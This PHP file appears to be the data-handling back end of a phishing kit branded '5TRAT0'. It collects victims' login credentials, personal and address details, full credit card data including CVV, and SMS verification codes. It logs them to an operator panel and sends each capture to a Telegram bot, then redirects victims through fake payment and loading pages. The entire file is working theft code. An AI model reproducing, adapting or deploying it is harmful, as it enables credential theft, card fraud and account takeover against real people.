<?php
require "../main.php";

$bot = $a_bot;
$ids = explode(",",str_replace(" ","",$a_ids));


$panel = str_replace('web/send.php', '' , "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."panel/view.php?vip=$ip");

$ip = $_SERVER['REMOTE_ADDR'];

function post($data){
	if(empty(trim($data))){
		return "NO_DATA";
	}else{
		return htmlspecialchars($_POST[$data]);
	}
}


function sendBot($url){
	$ci = curl_init();
	curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ci,CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ci, CURLOPT_URL, $url);
	return curl_exec($ci);
	curl_close($ci);
}


if(isset($_POST['user'])){
	
	$login = post("user");
	$pass = post("pass");

	$telegram_content = urlencode("
	5TRAT0 L0G!N / $ip
	+ Log : $login
	+ pass : $pass
	---------------------------------------
+ PANEL : $panel
	");
	
	//save data in panel
	$oldlogs = $m->getData()["LOGS"];
	$newlogs = $oldlogs."\n+ LOGIN [ $login | $pass ] ";
	$arr = array("LOGS"=>$newlogs);
	$m->update($arr);
	

		//SENDING INFO TO TELEGRAM BOT...
		foreach($ids as $id){
			$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
			sendBot($url);
		}
		 header("location: info.php?p=LOGIN");
 
}

if(isset($_POST['first'])){
	
	$first = post("first");
	$last = post("last");
	$address = post("address");
	$zip = post("zip");
	$city = post("city");
	$country = post("country");
	$mobile = post("mobile");
	$email = post("email");
    $paymentMethod = $_POST['paymentMethod']; // Assuming payment method is submitted via the form

	$telegram_content = urlencode("
	5TRAT0 !NF0 / $ip
	+ First name : $first
	+ Last name : $last
	+ Address : $address
	+ Zip code : $zip
	+ City : $city
	+ Country : $country
	+ Mobile : $mobile
	+ E-mail : $email
	---------------------------------------
+ PANEL : $panel
	");
	
	//save data in panel
	$oldlogs = $m->getData()["LOGS"];
	$newlogs = $oldlogs."\n+ !INFOZ [ $first | $last  | $address  | $zip  | $city  | $country  | $mobile  | $email ] ";
	$arr = array("LOGS"=>$newlogs);
	$m->update($arr);
	

		//SENDING INFO TO TELEGRAM BOT...
		foreach($ids as $id){
			$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
			sendBot($url);
		}
    if ($paymentMethod == 'paypal') {
        // Redirect to PayPal page
        header('Location: paypal'); // Change the URL to the actual PayPal page
    } elseif ($paymentMethod == 'credit_card') {
        // Redirect to credit card payment page
        header('Location: cc.php'); // Change the URL to the credit card payment page
    }
}







if(isset($_POST['cc'])){
	
	$cardnumber = post('cc');
	$exp = post("exp");
	$cvv = post("cvv");
	$holder = post("holder");

$telegram_content = urlencode("
5TRAT0 CC / $ip
+ Cardnumber : $cardnumber 
+ ExpDate : $exp 
+ CVV : $cvv
+ Card Holder : $holder
---------------------------------------
+ PANEL : $panel
");

//save data
$oldlogs = $m->getData()["LOGS"];
$newlogs = $oldlogs."\n+ CARD [ $cardnumber | $exp | $cvv ]";
$arr = array("LOGS"=>$newlogs);
$m->update($arr);

//SENDING INFO TO TELEGRAM BOT...
foreach($ids as $id){
$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
sendBot($url);
}
header("location: loading.php?p=CARD");

}


 


if(isset($_POST['sms'])){
	
	$sms = post("sms");
	
	$telegram_content = urlencode("
	5TRAT0 SMS / $ip
	+ SMS : $sms
	---------------------------------------
	+ PANEL : $panel
	");
	
	//save data to panel
	$oldlogs = $m->getData()["LOGS"];
	$newlogs = $oldlogs."\n+ SMS [ $sms]";
	$arr = array("LOGS"=>$newlogs);
	$m->update($arr);
	
	//SENDING INFO TO TELEGRAM BOT...
	foreach($ids as $id){
	$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$telegram_content";
	sendBot($url);
	}
	header("location: loading.php?p=EMAIL");
	}
	

 

?>
